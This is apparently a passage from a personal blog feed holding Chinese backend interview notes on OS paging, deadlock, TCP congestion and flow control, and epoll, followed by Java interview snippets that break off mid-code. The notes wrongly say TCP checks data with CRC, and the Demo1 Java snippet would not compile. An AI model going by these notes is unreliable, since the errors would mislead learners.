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" alt="img">此时2号页是下一个要被置换出内存的页，置换时如果发现其使用位为1，则将使用位置0后顺时针旋转指针检查1号页。</p><p><strong>2.5 LRU（Least Recent Used, 最近最少使用）算法</strong>　　为获得对最优算法的模拟，提出了LRU算法。由于当前时间之后需要用到哪些页无法提前获知，于是记录当前时间之前页面的使用情况，认为之前使用过的页面以后还会被用到。在置换时，将最近使用最少的页面换出内存。此种方法的开销比较大。</p><h2><span id="死锁">死锁</span></h2><p>1）必要条件：</p><p>①互斥：某种资源一段时间内只允许一个进程访问。</p><p>②占有并等待：一个进程占有了一种资源，并在等待其他进程释放需要的另外资源。</p><p>③不可抢占：一个进程占有的资源，其他进程需要也不饿能抢占，只能等待。</p><p>④循环等待：存在一个进程链，每个进程占有上一个进程需要的某种资源。</p><p>2）检测死锁的方法有两个容器，一个用于保存<strong>线程正在请求的锁</strong>，一个用于保存<strong>线程已经持有的锁</strong>。每次加锁之前都会做如下检测:</p><p>1)检测当前正在请求的锁是否已经被其它线程持有,如果有，则把那些线程找出来</p><p>2)遍历第一步中返回的线程，检查自己持有的锁是否正被其中任何一个线程请求， <strong>如果第二步返回真,表示出现了死锁</strong></p><p>3）如何避免死锁</p><p>（1）<strong>死锁预防</strong></p><p>a、<strong>破坏“占有且等待”条件</strong></p><p>​方法1：所有的进程在开始运行之前，必须一次性地申请其在整个运行过程中所需要的全部资源。</p><p>​方法2： 允许进程只获得运行初期需要的资源，便开始运行，在运行过程中逐步释放掉分配到的已经使用完毕的资源，然后再去请求新的资源。</p><p><strong>b、破坏“不可抢占”条件</strong></p><p> 当一个已经持有了一些资源的进程在提出新的资源请求没有得到满足时，它必须释放已经保持的所有资源，待以后需要使用的时候再重新申请。</p><p><strong>c、破坏“循环等待”条件</strong></p><p>可以通过定义资源类型的线性顺序来预防，可将每个资源编号，当一个进程占有编号为i的资源时，那么它下一次申请资源只能申请编号大于i的资源。</p><h1><span id="计算机网络">计算机网络</span></h1><h2><span id="tcpx2fip中的攻击">TCP&#x2F;IP中的攻击</span></h2><ul><li><p>flood攻击</p></li><li><p>连接耗尽类攻击，与被攻击方，完成三次握手后不再发送报文，一直维持连接， 或者立即发送FIN报文，断开后又立即连接。 消耗TCP连接资源。</p></li><li><p>流量控制相关的攻击：通告窗口较小，传输减慢，长时间占用资源。</p></li></ul><h2><span id="http10和http11的主要区别">Http1.0和Http1.1的主要区别 √</span></h2><ul><li><p>Http1.1默认使用长连接keep-alive，而http1.0默认短连接，也就是每次请求都要重新建立一次连接。每一次建立或者断开连接，都需要三次握手四次挥手的开销，如果每次请求都要这样的话，开销会比较大。</p></li><li><p>增加了错误代码：如410（gone）：表示服务器上某个资源被永久删除。</p></li><li><p>节约带宽：http 1.1支持只发送header信息(不带任何body信息)，如果服务器认为客户端有权限请求服务器，则返回100，否则返回401。客户端如果接收到100，才开始把请求body发送到服务器。</p></li><li><p>host域：设置虚拟站点</p></li></ul><h2><span id="http11与http-20的主要区别-">http1.1与http 2.0的主要区别 -</span></h2><ul><li>http2.0使用了多路复用的技术，做到同一个连接并发处理多个请求，而且并发请求的数量比http1.1大了好几个数量级。</li></ul><h2><span id="rtt和rto">RTT和RTO √</span></h2><p>RTO：从上一次发送数据，因为长期没有收到ACK响应，到下一次重发之间的时间。就是<strong>重传间隔</strong>。</p><p>RTT：数据从发送到接收到对方响应之间的时间间隔，即数据报在网络中一个往返用时。大小不稳定。</p><p>通常<strong>每次重传RTO是前一次重传间隔的两倍</strong>，计量单位通常是RTT。例：1RTT，2RTT，4RTT，8RTT……<br>重传次数到达上限之后停止重传。(一般初始是2倍MSL）</p><h2><span id="拥塞控制">拥塞控制</span></h2><p>慢开始门限ssthreth状态变量，当cwnd &lt; ssthreth时，使用慢开始算法；当cwnd &gt; ssthrerth时，使用拥塞控制算法；如果两者相等，两个都可以使用。</p><p>慢启动阶段是指数级上升cwnd（拥塞窗口） x倍的最大报文段MSS</p><p>1）何时结束慢启动？</p><p>(1)发生一个由<strong>超时指示</strong>的丢包事件，将ssthresh状态变量设为cwnd值的一半，cwnd将设为1个MSS，并重新开始慢启动。</p><p>(2)当cwnd的值到达或超过ssthresh时，结束慢启动，TCP转移到拥塞避免模式。</p><p>(3)若检测到<strong>3个冗余ACK</strong>，TCP执行一种<strong>快速重传</strong>，并进入快速恢复状态。</p><p><strong>拥塞避免</strong></p><p>线性增长阶段称之为拥塞避免</p><p>当达到最大值MAX之后，我们该怎么办呢？</p><p>何时结束拥塞避免的线性增长？<br>    （1）出现超时，ssthresh被设置为cwnd的一半，cwnd的值被置为1个MSS，进入慢启动。</p><p>​（2）收到3个冗余ACK，ssthresh被设置为cwnd的一半，cwnd为原来的一半加上3个MSS，，启动快速重传，并进入<strong>快速恢复</strong>状态。</p><p><strong>快速恢复</strong></p><p>我们就回到最初的最初的状态，也就是说从1，2，4，8…..开始,不过这个时候我们还会把ssthresh调小，调为MAX值的一半，即ssthresh &#x3D; MAX &#x2F; 2。</p><p><strong>快速重传机制</strong></p><p>即当接收端收到比期望序号大的报文段时，便会重复发送最近一次确认的报文段的确认信号，我们称之为冗余ACK，如果发送端在超时重传定时器溢出之前，接收到连续的三个重复冗余ACK就重发该报文段。</p><h2><span id="流量控制">流量控制</span></h2><p>滑动窗口</p><p>当发送方收到接受窗口 win &#x3D; 0 时，这时发送方停止发送报文，并且同时开启一个定时器，每隔一段时间就发个测试报文去询问接收方，打听是否可以继续发送数据了，如果可以，接收方就告诉他此时接受窗口的大小；如果接受窗口大小还是为0，则发送方再次刷新启动定时器。</p><p>1）目的：接受方通过TCP头窗口字段告知发送方可接收的最大数据量——<strong>解决发送速率过快导致接受方无法接收的问题</strong>。  <strong>流量控制 —— 对点控制</strong><br>2）TCP是双工协议，双方可以同时通信，发送方和接受方各自维护一个发送窗和接收窗。发送窗：限制发送方可以发送的数据大小。接收窗：用来标记可以接收的数据大小。</p><h2><span id="tcp如何提供可靠数据传输">TCP如何提供可靠数据传输</span></h2><p>建立连接（标志位）：通信前确认通信实体存在。</p><p>序号机制（序号、确认号）：确保了数据是按序、完整到达。</p><p>数据校验（校验和）：CRC校验全部数据。</p><p>超时重传（定时器）：保证因链路故障未能到达数据能够被多次重发。</p><p>窗口机制（窗口）：提供流量控制，避免过量发送。</p><p>拥塞控制：同上。</p><h2><span id="如何区分流量控制和拥塞控制">如何区分流量控制和拥塞控制？</span></h2><p>流量控制属于通信双方协商；拥塞控制涉及通信链路全局。流量控制需要通信双方各维护一个发送窗、一个接收窗，对任意一方，接收窗大小由自身决定，发送窗大小由接收方响应的TCP报文段中窗口值确定；拥塞控制的拥塞窗口大小变化由试探性发送一定数据量数据探查网络状况后而自适应调整。实际最终发送窗口 &#x3D; min{流控发送窗口，拥塞窗口}。</p><h2><span id="操作系统">操作系统</span></h2><h2><span id="select-epoll-poll">select epoll poll</span></h2><p>Select：是一个阻塞函数，如果一直没有fd发生事件，程序会一直阻塞在select函数那一行。</p><p>缺点：①1024 bitmap ②FDset不可重用 ③用户态《——》内核态 切换开销 ④O(n)的轮询</p><p>POLL：与select工作原理很像，但是用 pollfds取代了bitmap，pollfd以链表形式存在，所以理论上是无上线的。</p><p>Poll解决的问题：①pollfd 大小不止 1024 ②pollfd可以重用</p><p>EPOLL：基于事件的回调</p><p>默认LT模式，高速ET模式</p><p>①执行epoll_create时，创建了红黑树</p><p>②执行epoll_ctl（配置需要监听的fd及其事件）时，创建<strong>就绪List链表</strong>，如果增加fd添加到红黑树上，然后向内核注册 <strong>有事件到来时的回调函数</strong> ， 当设备上的中断事件来临时，回调函数会向list链表中插入就绪的fd并唤醒epoll_wait进程。</p><p>③执行epoll_wait时，立刻返回准备就绪链表里的数据即可。</p><p>解决问题：①不需要切换 用户内核态拷贝开销 ②遍历复杂度是O(1)</p><p>如果采用EPOLLLT模式的话，系统中一旦有大量你不需要读写的就绪文件描述符，它们每次调用epoll_wait都会返回，这样会大大降低处理程序检索自己关心的就绪文件描述符的效率.。而采用EPOLLET这种边沿触发模式的话，当被监控的文件描述符上有可读写事件发生时，epoll_wait()会通知处理程序去读写。如果这次没有把数据全部读写完(如读写缓冲区太小)，那么下次调用epoll_wait()时，它不会通知你，也就是它只会通知你一次，直到该文件描述符上出现第二次可读写事件才会通知你！！！<strong>这种模式比水平触发效率高，系统不会充斥大量你不关心的就绪文件描述符</strong></p><h2><span id="http-keep-alive与tcp-keep-alive">http keep-alive与tcp keep-alive</span></h2><p>链接建立之后，如果应用程序或者上层协议一直不发送数据，或者隔很长时间才发送一次数据，当链接很久没有数据报文传输时如何去确定对方还在线，到底是掉线了还是确实没有数据传输，链接还需不需要保持，这种情况在TCP协议设计中是需要考虑到的。</p><p>http keep-alive与tcp keep-alive，不是同一回事，意图不一样。http keep-alive是为了让tcp活得更久一点，以便在同一个连接上传送多个http，提高socket的效率。而<strong>tcp keep-alive是TCP的一种检测TCP连接状况的保鲜机制</strong>。</p><h2><span id="redis实习缓存同步">Redis实习缓存同步</span></h2><h1><span id="实际问题">实际问题</span></h1><h2><span id="怎么解决bug问题有用日志吗">怎么解决bug问题，有用日志吗？</span></h2><p>使用jstack通过pid去dump出堆栈信息</p><p>使用slf4j框架，内部使用logback</p><h1><span id="其他">其他</span></h1><h2><span id="哈希冲突法">哈希冲突法</span></h2><p>​1.开放地址法</p><p>　　　按顺序决定哈希值时，如果某数据的哈希值已经存在，则在原来哈希值的基础上往后加一个单位，直至不发生哈希冲突。</p><ol start="2"><li><p>拉链法 </p><p>HashMap的方法</p></li><li><p>再哈希法</p><p>对于冲突的哈希值使用其他哈希法哈希，直至没有哈希冲突。</p></li><li><p>建立公共溢出区</p><p>建立公共溢出区存储所有哈希冲突的数据。</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;腾讯后台面经&lt;/p&gt;</summary>
    
    
    
    <category term="面经" scheme="https://disda-coding.github.io/categories/%E9%9D%A2%E7%BB%8F/"/>
    
    
    <category term="Tencent" scheme="https://disda-coding.github.io/tags/Tencent/"/>
    
  </entry>
  
  <entry>
    <title>面试常考算法题</title>
    <link href="https://disda-coding.github.io/2020/04/14/Exam/"/>
    <id>https://disda-coding.github.io/2020/04/14/Exam/</id>
    <published>2020-04-14T02:34:47.000Z</published>
    <updated>2020-04-15T07:54:12.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>面试常考的coding</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%89%9B%E5%AE%A2%E7%BD%91%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA">牛客网输入输出</a></li></ul><ul><li><a href="#%E6%A0%91">树</a><ul><li><a href="#%E6%A0%91%E7%9A%84%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86-">树的前序遍历 -</a></li><li><a href="#%E6%A0%91%E7%9A%84%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86-">树的中序遍历 -</a></li><li><a href="#%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86-">树的后序遍历 -</a></li></ul></li><li><a href="#%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F">设计模式</a><ul><li><a href="#%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F">工厂模式</a></li><li><a href="#%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F">单例模式</a></li></ul></li><li><a href="#%E7%AE%97%E6%B3%95">算法</a><ul><li><a href="#%E6%AD%BB%E9%94%81">死锁</a><ul><li><a href="#%E4%B8%80%E4%BB%80%E4%B9%88%E6%98%AF%E6%AD%BB%E9%94%81">一.什么是死锁？</a></li><li><a href="#%E4%BA%8C%E4%BA%A7%E7%94%9F%E6%AD%BB%E9%94%81%E7%9A%84%E5%9B%9B%E4%B8%AA%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6">二.产生死锁的四个必要条件</a></li><li><a href="#%E4%B8%89%E9%81%BF%E5%85%8D%E6%AD%BB%E9%94%81%E7%9A%84%E6%96%B9%E6%B3%95">三.避免死锁的方法</a><ul><li><a href="#1%E7%A0%B4%E5%9D%8F%E8%AF%B7%E6%B1%82%E5%92%8C%E4%BF%9D%E6%8C%81%E6%9D%A1%E4%BB%B6">1.破坏“请求和保持”条件</a></li><li><a href="#2%E7%A0%B4%E5%9D%8F%E4%B8%8D%E5%8F%AF%E6%8A%A2%E5%8D%A0%E6%9D%A1%E4%BB%B6">2.破坏“不可抢占”条件</a></li><li><a href="#3%E7%A0%B4%E5%9D%8F%E5%BE%AA%E7%8E%AF%E7%AD%89%E5%BE%85%E6%9D%A1%E4%BB%B6">3.破坏“循环等待”条件</a></li></ul></li></ul></li><li><a href="#lru">LRU</a></li><li><a href="#%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85">生产者消费者</a></li></ul></li><li><a href="#%E6%8E%92%E5%BA%8F">排序</a><ul><li><a href="#%E5%BF%AB%E6%8E%92">快排 √</a><ul><li><a href="#1-%E6%9C%80%E4%BC%98%E6%83%85%E5%86%B5">1、最优情况</a></li><li><a href="#2-%E6%9C%80%E7%B3%9F%E7%B3%95%E6%83%85%E5%86%B5">2、最糟糕情况</a></li></ul></li><li><a href="#%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9">快速选择 √</a></li><li><a href="#%E5%A0%86%E6%8E%92">堆排</a></li><li><a href="#%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F">归并排序 √</a></li></ul></li></ul><!-- tocstop --><h2><span id="牛客网输入输出">牛客网输入输出</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输入描述:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输入包括2行：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一行为整数n(1 &lt;= n &lt;= 50)，即抹除一个数之后剩下的数字个数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第二行为n个整数num[i] (1 &lt;= num[i] &lt;= 1000000000)</span></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Next</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> N=sc.nextInt();</span><br><span class="line">        <span class="type">int</span>[] num = <span class="keyword">new</span> <span class="title class_">int</span>[N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            num[i] = sc.nextInt();</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sc.nextLine();</span><br><span class="line">        <span class="type">char</span>[] arr = str.toCharArray();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输入包括n+1行：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一行为单词个数n(1 ≤ n ≤ 50)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//接下来的n行，每行一个单词word[i]，长度length(1 ≤ length ≤ 50)。由小写字母构成</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> N;</span><br><span class="line">    <span class="keyword">private</span> String[] arr;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       </span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        N = sc.nextInt();</span><br><span class="line">        arr = <span class="keyword">new</span> <span class="title class_">String</span>[demo.N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; demo.N; i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sc.next();           </span><br><span class="line">        &#125;      </span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="树">树</span></h1><h2><span id="树的前序遍历-">树的前序遍历 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">       Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">       s.push(root);</span><br><span class="line">       <span class="keyword">while</span>(!s.isEmpty())&#123;</span><br><span class="line">           root=s.pop();</span><br><span class="line">           res.add(root.val);</span><br><span class="line">           <span class="keyword">if</span>(root.right!=<span class="literal">null</span>) s.push(root.right);</span><br><span class="line">           <span class="keyword">if</span>(root.left!=<span class="literal">null</span>) s.push(root.left);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="树的中序遍历-">树的中序遍历 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> <span class="title class_">Stack</span>();       </span><br><span class="line">        <span class="keyword">while</span>(!s.isEmpty()||root!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    s.push(root);</span><br><span class="line">                    root=root.left;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                root = s.pop();</span><br><span class="line">                res.add(root.val);</span><br><span class="line">                root=root.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="树的后序遍历-">树的后序遍历 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        Stack&lt;TreeNode&gt; s1 = <span 